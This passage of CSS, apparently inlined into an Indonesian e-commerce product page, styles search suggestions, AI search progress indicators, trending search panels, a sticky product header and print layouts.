  border-radius: 0 0 8px 8px;
}

.suggest-item {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 10px 16px;
  cursor: pointer;
  transition: all 0.2s ease;
  border-bottom: 1px solid #f1f5f9;
}

.suggest-item:last-child {
  border-bottom: none;
}

.suggest-item:hover,
.suggest-item.active {
  background: linear-gradient(90deg, #f8fafc 0%, #f1f5f9 100%);
  padding-left: 20px;
}

.suggest-thumb {
  width: 42px;
  height: 42px;
  object-fit: cover;
  border: 1px solid #ddd;
  border-radius: 4px;
  background: #fafafa;
}

.suggest-meta { flex: 1; min-width: 0; }

.suggest-name {
  font-weight: 500;
  color: #222;
  line-height: 1.2;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.suggest-price {
  color: #8adeff;
  font-size: 12px;
  margin-top: 2px;
}

/* AI Insights */
.suggest-ai-insight {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 8px 12px;
  background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
  border-bottom: 1px solid #bae6fd;
  color: #0369a1;
  font-size: 12px;
  font-weight: 500;
  line-height: 1.4;
}

.suggest-ai-insight svg {
  flex-shrink: 0;
  opacity: 0.8;
}

.suggest-ai-insight span {
  flex: 1;
}

/* AI Progress States */
.ai-progress-container {
  padding: 20px 16px;
  background: linear-gradient(135deg, #fafbff 0%, #f5f7ff 100%);
}

.ai-progress-header {
  display: flex;
  align-items: center;
  gap: 10px;
  margin-bottom: 16px;
}

.ai-progress-icon {
  width: 36px;
  height: 36px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  border-radius: 50%;
  color: #fff;
  font-size: 18px;
  animation: aiIconSpin 3s linear infinite;
}

@keyframes aiIconSpin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.ai-progress-text {
  flex: 1;
}

.ai-progress-title {
  font-weight: 600;
  color: #1e293b;
  font-size: 14px;
  margin-bottom: 2px;
}

.ai-progress-subtitle {
  font-size: 12px;
  color: #64748b;
}

/* Progress Steps */
.ai-progress-steps {
  display: flex;
  flex-direction: column;
  gap: 10px;
  margin-top: 16px;
}

.ai-progress-step {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 8px 12px;
  background: #fff;
  border-radius: 8px;
  border: 1px solid #e2e8f0;
  transition: all 0.3s ease;
}

.ai-progress-step.active {
  border-color: #667eea;
  background: #f8f9ff;
  box-shadow: 0 2px 8px rgba(102, 126, 234, 0.1);
}

.ai-progress-step.completed {
  border-color: #10b981;
  background: #f0fdf4;
}

.ai-step-icon {
  width: 20px;
  height: 20px;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 50%;
  font-size: 11px;
  flex-shrink: 0;
}

.ai-progress-step.active .ai-step-icon {
  background: #667eea;
  color: #fff;
  animation: pulse 1.5s ease-in-out infinite;
}

.ai-progress-step.completed .ai-step-icon {
  background: #10b981;
  color: #fff;
}

.ai-progress-step.pending .ai-step-icon {
  background: #e2e8f0;
  color: #94a3b8;
}

.ai-step-text {
  flex: 1;
  font-size: 13px;
  color: #475569;
  font-weight: 500;
}

.ai-progress-step.completed .ai-step-text {
  color: #059669;
}

/* AI Analysis Result Banner */
.ai-result-banner {
  padding: 12px 16px;
  background: linear-gradient(135deg, #ecfdf5 0%, #d1fae5 100%);
  border-bottom: 1px solid #86efac;
  display: flex;
  align-items: center;
  gap: 10px;
}

.ai-result-icon {
  font-size: 20px;
  animation: bounceIn 0.5s ease;
}

@keyframes bounceIn {
  0% { transform: scale(0); opacity: 0; }
  50% { transform: scale(1.1); }
  100% { transform: scale(1); opacity: 1; }
}

.ai-result-text {
  flex: 1;
}

.ai-result-title {
  font-weight: 600;
  color: #065f46;
  font-size: 13px;
  margin-bottom: 2px;
}

.ai-result-description {
  font-size: 12px;
  color: #047857;
  opacity: 0.9;
}

/* Product Items Section Header */
.suggest-section-header {
  padding: 10px 16px;
  background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
  border-bottom: 1px solid #e2e8f0;
}

.suggest-header-main {
  display: flex;
  align-items: center;
  gap: 6px;
  margin-bottom: 4px;
}

.suggest-header-icon {
  font-size: 14px;
}

.suggest-header-text {
  font-size: 12px;
  font-weight: 600;
  color: #64748b;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.suggest-header-hint {
  font-size: 11px;
  color: #94a3b8;
  font-weight: 400;
  text-transform: none;
  letter-spacing: 0;
  display: flex;
  align-items: center;
  gap: 4px;
}

.suggest-header-hint kbd {
  display: inline-block;
  padding: 2px 6px;
  font-size: 10px;
  font-weight: 600;
  line-height: 1;
  color: #475569;
  background: #fff;
  border: 1px solid #cbd5e1;
  border-radius: 4px;
  box-shadow: 0 1px 2px rgba(0,0,0,0.05);
  font-family: 'Segoe UI', monospace;
}

/* Footer Hint */
.suggest-footer-hint {
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 12px 16px;
  background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
  border-top: 1px solid #8adeff;
  color: #8adeff;
  font-size: 12px;
  font-weight: 500;
  text-align: center;
  cursor: default;
}

.suggest-footer-hint svg {
  color: #8adeff;
  flex-shrink: 0;
}

.suggest-footer-hint kbd {
  display: inline-block;
  padding: 3px 7px;
  margin: 0 3px;
  font-size: 11px;
  font-weight: 600;
  line-height: 1;
  color: #8adeff;
  background: #fff;
  border: 1px solid #8adeff;
  border-radius: 4px;
  box-shadow: 0 1px 3px rgba(245, 158, 11, 0.2);
  font-family: 'Segoe UI', monospace;
}

.suggest-footer-link {
  color: #8adeff;
  font-weight: 600;
  text-decoration: underline;
  text-underline-offset: 2px;
  text-decoration-thickness: 1px;
  cursor: pointer;
  transition: all 0.2s ease;
}

.suggest-footer-link:hover {
  color: #8adeff;
  text-decoration-thickness: 2px;
  text-shadow: 0 0 8px rgba(18, 131, 206, 0.3);
}

/* Loading state */
.suggest-loading {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  padding: 16px 12px;
  color: #64748b;
  font-size: 13px;
}

@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.5; }
}

.suggest-loading {
  animation: pulse 1.5s ease-in-out infinite;
}

/* Responsive Mobile Styles */
@media (max-width: 768px) {
  .ai-bot-toggle {
    padding: 6px;
    margin-left: 0;
  }
  
  .ai-bot-toggle .bot-icon {
    width: 20px;
    height: 20px;
  }
  
  .search-icon-btn {
    margin-right: 4px;
  }
  
  .search-icon-btn svg {
    width: 18px;
    height: 18px;
  }
  
  .search-suggest {
    max-height: 350px;
  }
  
  /* Mobile hint adjustments */
  .suggest-header-hint {
    font-size: 10px;
  }
  
  .suggest-header-hint kbd {
    padding: 1px 4px;
    font-size: 9px;
  }
  
  .suggest-footer-hint {
    padding: 10px 12px;
    font-size: 11px;
  }
  
  .suggest-footer-hint svg {
    width: 14px;
    height: 14px;
  }
  
  .suggest-footer-hint kbd {
    padding: 2px 5px;
    font-size: 10px;
  }
  
  .ai-progress-container {
    padding: 16px 12px;
  }
  
  .ai-progress-icon {
    width: 32px;
    height: 32px;
    font-size: 16px;
  }
  
  .ai-progress-title {
    font-size: 13px;
  }
  
  .ai-progress-subtitle {
    font-size: 11px;
  }
  
  .ai-progress-step {
    padding: 6px 10px;
  }
  
  .ai-step-text {
    font-size: 12px;
  }
  
  .suggest-item {
    padding: 8px 12px;
  }
  
  .suggest-thumb {
    width: 36px;
    height: 36px;
  }
  
  .suggest-name {
    font-size: 13px;
  }
  
  .suggest-price {
    font-size: 11px;
  }
}

@media (max-width: 480px) {
  .ai-bot-toggle {
    padding: 4px;
  }
  
  .ai-bot-toggle .bot-icon {
    width: 18px;
    height: 18px;
  }
  
  .search-icon-btn svg {
    width: 16px;
    height: 16px;
  }
  
  /* Ultra-compact hints for small screens */
  .suggest-header-hint {
    display: none; /* Hide header hint on very small screens */
  }
  
  .suggest-footer-hint {
    padding: 8px 10px;
    font-size: 10px;
    flex-direction: column;
    gap: 4px;
  }
  
  .suggest-footer-hint svg {
    display: none; /* Hide icon to save space */
  }
  
  .suggest-footer-hint kbd {
    padding: 2px 4px;
    font-size: 9px;
  }
  
  .ai-progress-steps {
    gap: 8px;
  }
  
  .ai-step-text {
    font-size: 11px;
  }
}

/* AI Search Prompt Box */
.ai-search-prompt {
  padding: 24px;
  background: linear-gradient(135deg, #fff5f0 0%, #ffffff 100%);
}

.ai-prompt-header {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 16px;
}

.ai-prompt-icon {
  width: 48px;
  height: 48px;
  background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 24px;
  box-shadow: 0 4px 12px rgba(251, 146, 60, 0.3);
}

.ai-prompt-text {
  flex: 1;
}

.ai-prompt-title {
  font-size: 16px;
  font-weight: 700;
  color: #1f2937;
  margin-bottom: 4px;
}

.ai-prompt-subtitle {
  font-size: 13px;
  color: #6b7280;
}

.ai-prompt-query {
  background: white;
  border: 2px solid #8adeff;
  border-radius: 8px;
  padding: 12px 16px;
  margin-bottom: 16px;
}

.ai-query-label {
  font-size: 11px;
  font-weight: 600;
  color: #8adeff;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  margin-bottom: 4px;
}

.ai-query-text {
  font-size: 15px;
  font-weight: 600;
  color: #1f2937;
}

.ai-search-trigger-btn {
  width: 100%;
  padding: 14px 20px;
  background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
  color: white;
  border: none;
  border-radius: 10px;
  font-size: 15px;
  font-weight: 700;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  transition: all 0.3s ease;
  box-shadow: 0 4px 12px rgba(18, 131, 206, 0.3);
}

.ai-search-trigger-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 20px rgba(18, 131, 206, 0.3);
}

.ai-search-trigger-btn:active {
  transform: translateY(0);
}

.ai-btn-icon {
  font-size: 18px;
  animation: sparkle 2s ease-in-out infinite;
}

@keyframes sparkle {
  0%, 100% { opacity: 1; transform: scale(1); }
  50% { opacity: 0.7; transform: scale(1.2); }
}

.ai-btn-text {
  font-size: 15px;
}

.ai-prompt-footer {
  margin-top: 12px;
  text-align: center;
  font-size: 12px;
  color: #9ca3af;
  font-style: italic;
}

/* ==================== TRENDING SEARCH STYLES ==================== */

.search-suggest.trending-mode {
  border-top: 3px solid #8adeff;
  max-width: 900px;
  min-width: 600px;
}

/* Two-column container */
.trending-container {
  display: flex;
  gap: 0;
  padding: 0 !important;
}

.trending-column {
  flex: 1;
  min-width: 0;
  padding: 0 !important;
}

.trending-column.trending-searches {
  border-right: 2px solid #e2e8f0; padding: 0 !important;
}

/* Mobile: stack columns vertically */
@media (max-width: 768px) {
  .search-suggest.trending-mode {
    min-width: auto;
    max-width: 100%;
  }
  
  .trending-container {
    flex-direction: column;
  }
  
  .trending-column.trending-searches {
    border-right: none;
    border-bottom: 2px solid #e2e8f0;
  }
}

.trending-header {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 14px 16px;
  border-bottom: 1px solid #e2e8f0;
  background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
  color: white;
  position: sticky;
  top: 0;
  z-index: 10;
}

.trending-icon {
  font-size: 20px;
  animation: trendingPulse 2s infinite;
}

@keyframes trendingPulse {
  0%, 100% { 
    transform: scale(1); 
    filter: drop-shadow(0 0 0 rgba(251, 146, 60, 0));
  }
  50% { 
    transform: scale(1.15); 
    filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.8));
  }
}

.trending-title {
  font-weight: 700;
  font-size: 14px;
  letter-spacing: 0.3px;
}

.trending-subtitle {
  font-size: 11px;
  opacity: 0.9;
  margin-left: auto;
  font-style: italic;
}

/* Trending searches item */
.trending-item {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 12px 16px;
  cursor: pointer;
  transition: all 0.2s ease;
  border-bottom: 1px solid #f1f5f9;
  position: relative;
}

.trending-item:hover {
  background: linear-gradient(90deg, #fff7ed 0%, #ffedd5 100%);
  padding-left: 20px;
}

.trending-item:hover::before {
  content: '';
  position: absolute;
  left: 0;
  top: 0;
  bottom: 0;
  width: 4px;
  background: linear-gradient(180deg, #8adeff 0%, #8adeff 100%);
}

.trending-item:last-child {
  border-bottom: none;
}

.trending-rank {
  font-size: 20px;
  flex-shrink: 0;
  width: 32px;
  text-align: center;
}

.trending-query {
  flex: 1;
  font-size: 14px;
  color: #1f2937;
  font-weight: 500;
  line-height: 1.4;
}

.trending-category {
  font-size: 11px;
  color: #8adeff;
  background: #fff7ed;
  padding: 3px 10px;
  border-radius: 12px;
  white-space: nowrap;
  font-weight: 500;
  border: 1px solid #fed7aa;
}

/* Trending products item */
.trending-product-item {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 12px 16px;
  cursor: pointer;
  transition: all 0.2s ease;
  border-bottom: 1px solid #f1f5f9;
  position: relative;
}

.trending-product-item:hover {
  background: linear-gradient(90deg, #fef3c7 0%, #fde68a 100%);
  padding-left: 20px;
}

.trending-product-item:hover::before {
  content: '';
  position: absolute;
  left: 0;
  top: 0;
  bottom: 0;
  width: 4px;
  background: linear-gradient(180deg, #8adeff 0%, #8adeff 100%);
}

.trending-product-item:last-child {
  border-bottom: none;
}

.trending-product-thumb {
  width: 48px;
  height: 48px;
  object-fit: cover;
  border-radius: 8px;
  border: 1px solid #e5e7eb;
  flex-shrink: 0;
  background: white;
}

.trending-product-info {
  flex: 1;
  min-width: 0;
}

.trending-product-name {
  font-size: 13px;
  font-weight: 400;
  color: #1f2937;
  line-height: 1.4;
  margin-bottom: 0;
  padding: 0 !important;
  overflow: hidden;
  text-overflow: ellipsis;
  display: -webkit-box;
  -webkit-line-clamp: 2;
  -webkit-box-orient: vertical;
}

.trending-product-price {
  font-size: 12px;
  font-weight: 700;
  color: #8adeff;
  padding: 4px 0 !important;
}
.trending-product { padding: 0;}
/* ==================== END TRENDING STYLES ==================== */

</style>
  <style data-inlined="product-detail.css">
/* === PRODUCT DETAIL v3 (Tokopedia-like) â€” Full stylesheet === */

/* Root / Container */
.product-single {
  --pd-gap: 2rem;
  --pd-border: #e2e8f0;
  --pd-bg: #ffffff;
  --pd-muted: #64748b;
  --pd-dark: #0f172a;
  --pd-accent: #0d6efd; /* tema utama situs */
  --pd-radius: 12px;
  --pd-soft: #f8fafc;
  --pd-soft-border: #e5e7eb;
  --pd-danger: #8adeff;
  --pd-success-bg: #dcfce7;
  --pd-success-text: #166534;
  --pd-danger-bg: #fee2e2;
  --pd-danger-text: #8adeff;
  --pd-shadow: 0 6px 20px -10px rgba(0,0,0,.12);
  --pd-transition: .25s cubic-bezier(.4,.0,.2,1);
  max-width:1280px;
  margin-inline:auto;
}

/* === Sticky Product Header Bar (muncul saat scroll) === */
.pd-sticky-header {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  z-index: 998;
  background: rgba(255, 255, 255, 0.98);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  border-bottom: 1px solid rgba(226, 232, 240, 0.8);
  box-shadow: 0 4px 16px -4px rgba(0, 0, 0, 0.08);
  transform: translateY(-100%);
  opacity: 0;
  transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), 
              opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  pointer-events: none;
}

.pd-sticky-header.visible {
  transform: translateY(0);
  opacity: 1;
  pointer-events: auto;
}

.pd-sticky-header-container {
  max-width: 1280px;
  margin: 0 auto;
  padding: 12px 20px;
  display: flex;
  align-items: center;
  gap: 16px;
}

.pd-sticky-thumb {
  width: 48px;
  height: 48px;
  flex-shrink: 0;
  border-radius: 8px;
  border: 1px solid #e2e8f0;
  overflow: hidden;
  background: #f8fafc;
}

.pd-sticky-thumb img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  display: block;
}

.pd-sticky-info {
  flex: 1;
  min-width: 0;
  display: flex;
  flex-direction: column;
  gap: 4px;
}

.pd-sticky-title {
  font-size: 0.9rem;
  font-weight: 600;
  color: #0f172a;
  line-height: 1.3;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  margin: 0;
}

.pd-sticky-price-row {
  display: flex;
  align-items: center;
  gap: 8px;
  flex-wrap: wrap;
}

.pd-sticky-price {
  font-size: 1.1rem;
  font-weight: 700;
  color: #0d6efd;
  line-height: 1;
}

.pd-sticky-price-original {
  font-size: 0.75rem;
  color: #94a3b8;
  text-decoration: line-through;
  line-height: 1;
}

.pd-sticky-discount {
  background: #8adeff;
  color: #fff;
  font-size: 0.65rem;
  font-weight: 600;
  padding: 2px 6px;
  border-radius: 4px;
  letter-spacing: 0.3px;
  line-height: 1;
}

.pd-sticky-actions {
  display: flex;
  gap: 8px;
  flex-shrink: 0;
  align-items: center;
}

.pd-sticky-share-btn {
  padding: 8px 16px;
  border-radius: 8px;
  border: 1px solid #e2e8f0;
  background: #fff;
  color: #64748b;
  cursor: pointer;
  transition: all 0.2s ease;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.pd-sticky-share-btn:hover {
  background: #f8fafc;
  border-color: #cbd5e1;
  color: #0f172a;
  transform: translateY(-1px);
}

.pd-sticky-share-btn:active {
  transform: translateY(0);
}

.pd-sticky-share-btn svg {
  display: block;
  width: 16px;
  height: 16px;
}

.pd-sticky-btn-chat svg {
  width: 16px !important;
  height: 16px !important;
  max-width: none !important;
  margin-right: 4px;
  flex-shrink: 0;
}

.pd-sticky-btn {
  padding: 8px 16px;
  border-radius: 8px;
  font-size: 0.85rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
  border: 0;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  white-space: nowrap;
}

.pd-sticky-btn-cart {
  background: #fff;
  color: #0d6efd;
  border: 1px solid #0d6efd;
}

.pd-sticky-btn-cart:hover {
  background: rgba(13, 110, 253, 0.06);
}

.pd-sticky-btn-chat {
  background: #fff;
  color: #64748b;
  border: 1px solid #cbd5e1;
  flex: 0.8;
}

.pd-sticky-btn-chat:hover {
  background: #f8fafc;
  border-color: #94a3b8;
  color: #475569;
}

.pd-sticky-btn-buy {
  background: #0d6efd;
  color: #fff;
  border: 1px solid #0d6efd;
  box-shadow: 0 2px 8px -2px rgba(13, 110, 253, 0.4);
}

.pd-sticky-btn-buy:hover {
  filter: brightness(0.95);
}

.pd-sticky-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* Hide on mobile (use existing FAB instead) */
@media (max-width: 880px) {
  .pd-sticky-header {
    display: none;
  }
}

/* === PRINT STYLES (for PDF Export) === */
@media print {
  /* Reset & Base */
  * {
    -webkit-print-color-adjust: exact !important;
    print-color-adjust: exact !important;
  }
  
  body {
    background: white !important;
    margin: 0;
    padding: 0;
  }
  
  /* Hide all navigation, buttons, and interactive elements */
  nav, header, footer,
  nav *, header *, footer *,
  .navbar, .navbar *,
  .nav-item, .nav-link,
  .pd-sticky-header,
  .pd-sticky-header.visible,
  .pd-breadcrumb,
  .pd-sidebar,
  .pd-mobile-fab,
  .pd-share-btn,
  .pd-sticky-share-btn,
  #pd-share-btn,
  .share-button,
  [data-share-btn],
  button,
  .btn-add-cart,
  .btn-buy,
  .pd-actions,
  .pd-compare-section,
  .pd-compare-btn,
  .pd-compare-info,
  #pd-compare-btn,
  .compare-note,
  .compare-container,
  .compare-dropdown,
  .compare-panel,
  .compare-wrapper,
  [data-compare],
  [id*="compare"],
  [class*="compare"],
  .pd-thumb-gallery,
  .pd-installment-card,
  .pd-installment-card2,
  .inst-alt-banner--compact,
  .qoala-banner-card,
  .tradein-compact-card,
  .pwp-deals-section,
  #pwp-deals-section,
  .pwp-trigger-badge,
  .pd-related-full,
  #pd-similar,
  .pd-similar-strip,
  .pd-scroll-top,
  .stock-info-btn,
  .stock-popover,
  .pd-countdown-modern,
  .pd-share-modal-overlay,
  [id*="promo-"],
  .bottom-nav,
  .pd-buy-form,
  .pd-buy-card,
  .pd-extra-meta,
  .pd-reviews-section,
  #reviews,
  hr,
  .divider,
  .separator {
    display: none !important;
    visibility: hidden !important;
    opacity: 0 !important;
    height: 0 !important;
    max-height: 0 !important;
    overflow: hidden !important;
    margin: 0 !important;
    padding: 0 !important;
    border: none !important;
  }
  
  /* Extra aggressive reset for any remaining borders */
  .pd-info-card *,
  .pd-meta-inline *,
  .pd-variants * {
    border: none !important;
    border-top: none !important;
    border-bottom: none !important;
  }
  
  /* Layout restructure */
  .product-single {
    max-width: 100% !important;
    margin: 0 !important;
    padding: 0 !important;
    box-shadow: none !important;
  }
  
  /* Reset all shadows and borders for print */
  * {
    box-shadow: none !important;
  }
  
  .pd-top-layout {
    display: grid !important;
    grid-template-columns: 280px 1fr !important;
    gap: 24px !important;
    margin: 0 0 24px 0 !important;
    padding: 0 !important;
    page-break-inside: avoid;
    align-items: start !important;
  }
  
  /* Print header with logo - centered and larger */
  .product-single::before {
    content: "" !important;
    display: block !important;
    width: 150px !important;
    height: 50px !important;
    background: url('/assets/img/logo.png') no-repeat center !important;
    background-size: contain !important;
    margin: 0 auto 20px !important;
    visibility: visible !important;
    opacity: 1 !important;
  }
  
  /* Media card - left column */
  .pd-media-card {
    border: none !important;
    padding: 0 !important;
    margin: 0 !important;
    text-align: center;
    page-break-inside: avoid;
  }
  
  /* Hide desktop image, use mobile slider for both desktop and mobile */
  .pd-main-image {
    display: none !important;
  }
  
  /* Mobile slider - show first image only in print */
  .pd-mobile-slider {
    display: block !important;
    overflow: visible !important;
  }
  
  .pd-mslide {
    display: none !important;
  }
  
  .pd-mslide:first-child {
    display: block !important;
    border: 1px solid #e2e8f0 !important;
    max-width: 280px !important;
    margin: 0 auto !important;
    border-radius: 8px !important;
  }
  
  .pd-mslide:first-child img {
    max-height: 280px !important;
    width: 100% !important;
    height: auto !important;
    object-fit: contain !important;
  }
  
  /* Info card - right column */
  .pd-info-card {
    border: none !important;
    border-top: none !important;
    border-bottom: none !important;
    padding: 0 !important;
    margin: 0 !important;
    background: white !important;
    box-shadow: none !important;
  }
  
  /* Title */
  .pd-title-row {
    display: block !important;
    margin-bottom: 10px !important;
    border: none !important;
    border-top: none !important;
    border-bottom: none !important;
    padding: 0 !important;
    box-shadow: none !important;
    text-decoration: none !important;
  }
  
  /* Hide share button in print */
  .pd-title-row .pd-share-btn,
  .pd-title-row #pd-share-btn {
    display: none !important;
  }
  
  .pd-title {
    font-size: 13pt !important;
    color: #000 !important;
    margin: 0 0 10px 0 !important;
    page-break-after: avoid;
    font-weight: 700 !important;
    line-height: 1.3 !important;
    border: none !important;
    border-top: none !important;
    border-bottom: none !important;
    padding-bottom: 0 !important;
    box-shadow: none !important;
    text-decoration: none !important;
  }
  
  /* Price and QR container - side by side */
  .pd-price-qr-container {
    display: flex !important;
    gap: 16px !important;
    align-items: flex-start !important;
    margin-bottom: 14px !important;
    box-shadow: none !important;
    border: none !important;
    text-decoration: none !important;
  }
  
  /* Price block - left side */
  .pd-price-block {
    flex: 1 !important;
    margin: 0 !important;
    padding-bottom: 0 !important;
    border-bottom: none !important;
    box-shadow: none !important;
  }
  
  .pd-price-row {
    margin-bottom: 8px !important;
    border: none !important;
    border-top: none !important;
    border-bottom: none !important;
    padding: 0 !important;
  }
  
  /* Hide all empty or unnecessary elements in price row */
  .pd-price-row > span:empty,
  .pd-price-row > .sold-inline,
  #pd-sold-inline {
    display: none !important;
  }
  
  .pd-price-current {
    font-size: 18pt !important;
    color: #0d6efd !important;
  }
  
  /* Show price range for variant products in print */
  .pd-price-current[data-price-range]::after {
    content: attr(data-price-range) !important;
    display: block !important;
    font-size: 11pt !important;
    color: #64748b !important;
    margin-top: 4px !important;
    font-weight: normal !important;
  }
  
  /* Hide 'Range:' prefix text */
  .pd-price-current[data-price-range]::after {
    content: attr(data-price-range) !important;
  }
  
  .pd-price-original {
    font-size: 12pt !important;
    color: #64748b !important;
  }
  
  .pd-discount-badge {
    font-size: 10pt !important;
    padding: 2px 6px !important;
  }
  
  /* QR Code section - right side beside price */
  .pd-qr-print {
    display: block !important;
    flex: 0 0 100px !important;
    margin: 0 !important;
    padding: 8px !important;
    background: #f8fafc !important;
    border-radius: 8px !important;
    text-align: center !important;
    page-break-inside: avoid !important;
    border: 1px solid #cbd5e1 !important;
  }
  
  .pd-qr-label {
    font-size: 6.5pt !important;
    color: #64748b !important;
    margin-bottom: 5px !important;
    line-height: 1.2 !important;
    font-weight: 600 !important;
  }
  
  .pd-qr-image {
    width: 80px !important;
    height: 80px !important;
    display: block !important;
    margin: 0 auto !important;
  }
  
  /* Meta info */
  .pd-meta-inline {
    display: flex !important;
    gap: 12px !important;
    margin-bottom: 0 !important;
    padding-bottom: 14px !important;
    font-size: 10pt !important;
    border: none !important;
    border-top: none !important;
    border-bottom: none !important;
    padding-top: 0 !important;
    box-shadow: none !important;
    text-decoration: none !important;
    background: transparent !important;
  }
  
  /* Hide stock badge in print */
  .stock-badge,
  .stock-info-btn {
    display: none !important;
  }
  
  .sku {
    color: #64748b !important;
  }
  
  /* Hide sold badge if empty/zero */
  .sold-inline {
    display: none !important;
  }
  
  /* Hide variant summary section in print */
  .pd-variant-combined,
  #pd-variant-combined,
  .pd-variant-summary,
  [data-role="sold-chip"] {
    display: none !important;
  }
  
  /* Hide compare section completely in print */
  .pd-compare-section,
  .pd-compare-btn,
  #pd-compare-btn,
  .pd-compare-info,
  .compare-note,
  .compare-text,
  .compare-remove {
    display: none !important;
    visibility: hidden !important;
    height: 0 !important;
    margin: 0 !important;
    padding: 0 !important;
    overflow: hidden !important;
  }
  
  /* Variants - show all options with selected highlighted */
  .pd-variants {
    margin: 0 !important;
    padding: 0 !important;
    page-break-inside: avoid !important;
    border: none !important;
    border-top: none !important;
    border-bottom: none !important;
    box-shadow: none !important;
    background: transparent !important;
  }
  
  /* Add 'Variant:' label before variant groups */
  .pd-variants::before {
    content: "Variant:" !important;
    display: block !important;
    font-size: 11pt !important;
    font-weight: 700 !important;
    color: #0f172a !important;
    margin-bottom: 10px !important;
    border: none !important;
    padding: 0 !important;
    border-top: none !important;
    border-bottom: none !important;
  }
  
  .v-group {
    display: flex !important;
    align-items: center !important;
    gap: 8px !important;
    margin-bottom: 8px !important;
    line-height: 1 !important;
    page-break-inside: avoid !important;
    border: none !important;
    padding: 0 !important;
  }
  
  .v-group:last-child {
    margin-bottom: 0 !important;
  }
  
  .v-label {
    font-weight: 700 !important;
    margin: 0 !important;
    font-size: 9pt !important;
    color: #475569 !important;
    min-width: 60px !important;
    flex-shrink: 0 !important;
    border: none !important;
    padding: 0 !important;
  }
  
  .v-options {
    display: flex !important;
    gap: 6px !important;
    flex-wrap: wrap !important;
    border: none !important;
    padding: 0 !important;
    margin: 0 !important;
  }
  
  .v-chip {
    border: 1px solid #cbd5e1 !important;
    padding: 3px 10px !important;
    font-size: 9pt !important;
    background: #f8fafc !important;
    border-radius: 6px !important;
    display: inline-flex !important;
    align-items: center !important;
    page-break-inside: avoid !important;
  }
  
  /* Highlight selected variant with blue background */
  .v-chip.selected {
    background: #eff6ff !important;
    border-color: #2563eb !important;
    font-weight: 600 !important;
  }
  
  /* Hide radio inputs */
  .v-chip input[type="radio"] {
    display: none !important;
  }
  
  /* Hide "Habis" badge in print */
  .v-chip .chip-badge {
    display: none !important;
  }
  
  /* Short description - HIDDEN in print */
  .pd-short-desc {
    display: none !important;
  }
  
  /* QR Code section - right side beside price */
  .pd-qr-print {
    display: block !important;
    flex: 0 0 100px !important;
    margin: 0 !important;
    padding: 8px !important;
    background: #f8fafc !important;
    border-radius: 8px !important;
    text-align: center !important;
    page-break-inside: avoid !important;
    border: 1px solid #cbd5e1 !important;
  }
  
  .pd-qr-label {
    font-size: 6.5pt !important;
    color: #64748b !important;
    margin-bottom: 5px !important;
    line-height: 1.2 !important;
    font-weight: 600 !important;
  }
  
  .pd-qr-image {
    width: 80px !important;
    height: 80px !important;
    display: block !important;
    margin: 0 auto !important;
  }
  
  /* Full description - below 2 column layout */
  .pd-full-description {
    border: none !important;
    padding: 0 !important;
    margin: 24px 0 0 0 !important;
    page-break-before: avoid;
    grid-column: 1 / -1 !important;
  }
  
  .pd-full-desc-title {
    font-size: 13pt !important;
    font-weight: 700 !important;
    margin: 0 0 12px 0 !important;
    color: #000 !important;
    border-top: none !important;
    border-bottom: none !important;
    padding-top: 16px !important;
  }
  
  .pd-full-desc-body {
    font-size: 10pt !important;
    line-height: 1.6 !important;
    color: #334155 !important;
  }
  
  .pd-full-desc-body img {
    max-height: 200px !important;
    width: auto !important;
    page-break-inside: avoid;
    display: none !important; /* Hide images in print to save space */
  }
  
  /* Also target #deskripsi img if exists */
  #deskripsi img {
    max-width: 350px !important;
    height: auto !important;
  }
  
  .pd-full-desc-body table {
    border-collapse: collapse !important;
    width: 100% !important;
    margin: 12px 0 !important;
    font-size: 9pt !important;
  }
  
  .pd-full-desc-body th,
  .pd-full-desc-body td {
    border: 1px solid #cbd5e1 !important;
    padding: 6px 8px !important;
  }
  
  /* Print footer */
  .product-single::after {
    content: "Plaza IT - plazait.co.id | Printed: " attr(data-print-date);
    display: block;
    margin-top: 30px;
    padding-top: 16px;
    border-top: 1px solid #e2e8f0;
    font-size: 9pt;
    color: #64748b;
    text-align: center;
  }
  
  /* Page breaks */
  .pd-media-card,
  .pd-price-block,
  .pd-full-desc-title {
    page-break-after: avoid;
  }
  
  .pd-full-description {
    page-break-before: auto;
  }
}

/* === Breadcrumb (truncate last item) === */
.pd-breadcrumb{
  display:flex;
  flex-wrap:nowrap;
  align-items:center;
  gap:.5rem;
  font-size:.72rem;
